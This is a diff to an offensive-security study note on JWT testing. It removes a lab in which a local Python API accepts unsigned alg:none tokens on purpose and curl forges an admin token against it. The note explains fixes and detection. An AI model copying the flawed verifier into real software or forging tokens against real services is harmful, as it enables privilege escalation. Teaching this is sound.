@@ -1,7 +1,7 @@
 ---
 title: "JWT Security Testing"
 aliases: ["JWT Testing", "JSON Web Token Security"]
-tags: [tree/offensive, cyber/offensive/web/identity/jwt, type/technique, level/operator]
+tags: [tree/offensive, cyber/offensive/web/identity/jwt, type/technique, difficulty/medium]
 Domain: "[[Web Identity & Access Control]]"
 Color: "#DC143C"
 ---
@@ -14,7 +14,7 @@ Color: "#DC143C"
 ## Parent Learning Order
 Web Authentication Testing -> Broken Access Control -> JWT Security Testing -> Federated Identity & SSO -> MFA, Recovery & Session Bypass Testing
 
-## Start at Zero: A Token You Can Read, and Must Not Be Able to Forge
+## A Token You Can Read, and Must Not Be Able to Forge
 
 A **JSON Web Token (JWT)** is a compact, self-contained token that carries claims about a user (their ID, role, expiry) in a format the server can verify without a database lookup — which is why it is ubiquitous in modern APIs and SSO. A JWT has three parts, separated by dots: `header.payload.signature`. The header and payload are **base64-encoded JSON — not encrypted**, so anyone can read them. The signature is what makes the token trustworthy: the server signs the header+payload with a key, and verifies that signature on every request. If the signature verifies, the claims are trusted.
 
@@ -69,7 +69,7 @@ flowchart TD
     N --> P["Forged admin token (prove with synthetic identity)"]
 ```
 
-## Failure Modes and Interpretation
+## When alg:none is already patched
 
 - **Impersonating real users.** Forging a token for a real admin is over the line; prove with a synthetic identity and a benign claim.
 - **`alg: none` may be patched.** Modern libraries reject it, so a failed attempt may mean a hardened library. Try algorithm confusion and secret-cracking before concluding safe.
@@ -85,101 +85,13 @@ flowchart TD
 - **Do not put sensitive data in the payload** (it's readable), and set short expiry so a stolen token's window is small.
 - **Detection**: tokens with `alg: none`, unexpected algorithms, or claims inconsistent with issuance are the signals — but the durable defense is correct verification, since a properly-forged token that the server accepts looks legitimate.
 
-## Authorized Lab: Forge an `alg:none` Token
+## Summary
 
-> [!info] Runs on one Linux machine — builds an API that trusts a JWT without proper verification, then forges admin
-> Loopback, synthetic identity. Step 5 removes it.
+You should now be able to:
 
-### Step 1 — Build an API that accepts `alg:none` (the flaw)
-
-```bash
-cat > /tmp/jwt.py << 'EOF'
-import http.server, json, base64
-def b64d(s): return base64.urlsafe_b64decode(s + "="*(-len(s)%4))
-class H(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        tok=self.headers.get("Authorization","").replace("Bearer ","")
-        try:
-            h,p,sig = tok.split(".")
-            header=json.loads(b64d(h)); payload=json.loads(b64d(p))
-        except: self.send_response(401); self.end_headers(); return
-        # BUG: honors alg:none (accepts unsigned tokens)
-        if header.get("alg")=="none" or sig=="":
-            verified=True
-        else:
-            verified=(sig=="validsig")   # pretend real verification
-        if not verified: self.send_response(401); self.end_headers(); return
-        self.send_response(200); self.end_headers()
-        self.wfile.write(json.dumps({"role":payload.get("role"),"user":payload.get("user")}).encode())
-    def log_message(self,*a): pass
-http.server.HTTPServer(("127.0.0.1",8117),H).serve_forever()
-EOF
-python3 /tmp/jwt.py &>/dev/null &
-sleep 1; echo "JWT API up on 127.0.0.1:8117"
-```
-
-```text
-JWT API up on 127.0.0.1:8117
-```
-
-### Step 2 — A normal user token (baseline)
-
-```bash
-b64() { python3 -c "import base64,sys;print(base64.urlsafe_b64encode(sys.argv[1].encode()).decode().rstrip('='))" "$1"; }
-usertok="$(b64 '{"alg":"HS256"}').$(b64 '{"user":"alice","role":"user"}').validsig"
-curl -s -H "Authorization: Bearer $usertok" http://127.0.0.1:8117/me
-```
-
-```text
-{"role": "user", "user": "alice"}
-```
-
-Alice's properly-signed token identifies her as a regular user.
-
-### Step 3 — Forge an admin token with `alg:none` (the finding)
-
-```bash
-# change role to admin, set alg:none, drop the signature
-forged="$(b64 '{"alg":"none"}').$(b64 '{"user":"alice","role":"admin"}')."
-curl -s -H "Authorization: Bearer $forged" http://127.0.0.1:8117/me
-```
-
-```text
-{"role": "admin", "user": "alice"}
-```
-
-The forged token — with `alg:none` and **no signature** — was accepted, and the server now sees alice as `admin`. No key was needed; the app "verified" a token that declared it needed no verification. Privilege escalation via JWT, proven with a synthetic identity.
-
-### Step 4 — State the fix
-
-```bash
-echo "Fix: reject alg:none; pin the expected algorithm; verify the signature with a strong secret BEFORE trusting claims."
-echo "The token payload is readable by design — security is entirely in correct signature verification."
-```
-
-```text
-Fix: reject alg:none; pin the expected algorithm; verify the signature with a strong secret BEFORE trusting claims.
-The token payload is readable by design — security is entirely in correct signature verification.
-```
-
-### Step 5 — Cleanup
-
-```bash
-kill %1 2>/dev/null; rm -f /tmp/jwt.py; wait 2>/dev/null
-curl -s -o /dev/null -w "api gone: %{http_code}\n" --max-time 2 http://127.0.0.1:8117/me 2>&1 | grep -o 'gone.*' || echo "api gone: connection refused"
-```
-
-```text
-api gone: connection refused
-```
-
-**What you should now be able to do:** read a JWT's unencrypted payload, explain why security rests on signature verification, forge an `alg:none` token to escalate privilege, and name the algorithm-confusion and weak-secret variants plus their fixes.
-
-## Crook → Operator → Root Checkpoint
-
-- **Crook:** Explain the three JWT parts, why the payload is readable, and why the signature is what makes the token trustworthy.
-- **Operator:** Decode and tamper a JWT payload, forge an `alg:none` token to escalate role, and recognize the algorithm-confusion and weak-secret attacks.
-- **Root:** Explain why pinning the algorithm and verifying with a strong key are the fixes, why algorithm confusion turns a public key into a signing secret, and why sensitive data must never go in a JWT payload.
+- Explain the three JWT parts, why the payload is readable, and why the signature is what makes the token trustworthy.
+- Decode and tamper a JWT payload, forge an `alg:none` token to escalate role, and recognize the algorithm-confusion and weak-secret attacks.
+- Explain why pinning the algorithm and verifying with a strong key are the fixes, why algorithm confusion turns a public key into a signing secret, and why sensitive data must never go in a JWT payload.
 
 ---
 > 🔼 Up: [[Web Identity & Access Control]]
